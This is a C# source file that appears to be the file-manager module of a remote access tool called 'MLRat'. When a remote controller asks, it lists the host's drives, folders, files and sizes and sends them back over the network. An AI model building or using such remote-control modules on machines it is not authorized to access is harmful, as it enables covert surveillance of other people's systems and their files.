using MLRat.Client;
using SharedCode.Network;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;

namespace MLManagementClient.Handlers
{
    public static class FileManagerHandler
    {
        private static IClientConnection NetworkHost = null;
        public static void SetNetworkHost(IClientConnection _connection)
        {
            NetworkHost = _connection;
        }

        public static void Handle(object[] data)
        {
            FileManagerCommand command = (FileManagerCommand)data[1];
            Console.WriteLine("File Manager: {0}", command.ToString());
            if(command == FileManagerCommand.Update)
            {
                string path = (string)data[2];
                if(path == string.Empty)
                {
                    DriveInfo[] driveArray = DriveInfo.GetDrives();
                    string[] drives = new string[driveArray.Length];
                    string[] DriveSizes = new string[driveArray.Length];
                    string[] DriveLabels = new string[driveArray.Length];

                    for (int i = 0; i < drives.Length; i++)
                    {
                        drives[i] = driveArray[i].Name;
                        long len = driveArray[i].TotalSize;
                        string ext = "b";
                        if ((len / 1000) > 0)
                        {
                            len = len / 1000;
                            ext = "KB";
                            if ((len / 1000) > 0)
                            {
                                len = len / 1000;
                                ext = "MB";
                                if ((len / 1000) > 0)
                                {
                                    len = len / 1000;
                                    ext = "GB";
                                    if ((len / 1000) > 0)
                                    {
                                        len = len / 1000;
                                        ext = "TB";
                                    }
                                }
                            }
                        }
                        DriveSizes[i] = string.Format("{0} {1}", len, ext);
                        DriveLabels[i] = driveArray[i].VolumeLabel;
                    }
                    NetworkHost.Send((byte)NetworkCommand.FileManager, (byte)FileManagerCommand.DriveResponce, drives, DriveSizes, DriveLabels);
                }
                else
                {
                    try
                    {
                        DirectoryInfo di = new DirectoryInfo(path);
                        FileInfo[] Files = di.GetFiles();
                        DirectoryInfo[] dirs = di.GetDirectories();

                        string[] directoryNames = new string[dirs.Length];
                        string[] filenames = new string[Files.Length];
                        string[] filesizes = new string[Files.Length];

                        for (int i = 0; i < directoryNames.Length; i++)
                        {
                            directoryNames[i] = dirs[i].Name;
                        }
                        for (int i = 0; i < filenames.Length; i++)
                        {
                            filenames[i] = Files[i].Name;
                            long len = Files[i].Length;
                            string ext = "b";
                            if ((len / 1000) > 0)
                            {
                                len = len / 1000;
                                ext = "KB";
                                if ((len / 1000) > 0)
                                {
                                    len = len / 1000;
                                    ext = "MB";
                                    if ((len / 1000) > 0)
                                    {
                                        len = len / 1000;
                                        ext = "GB";
                                    }
                                }
                            }
                            filesizes[i] = string.Format("{0} {1}", len, ext);
                        }

                        NetworkHost.Send((byte)NetworkCommand.FileManager, (byte)FileManagerCommand.DirectoryResponce, directoryNames, filenames, filesizes);
                    }
                    catch(Exception ex)
                    {
                        NetworkHost.Send((byte)NetworkCommand.FileManager, (byte)FileManagerCommand.Invalid, ex.Message);
                    }
                }
            }
        }
    }
}
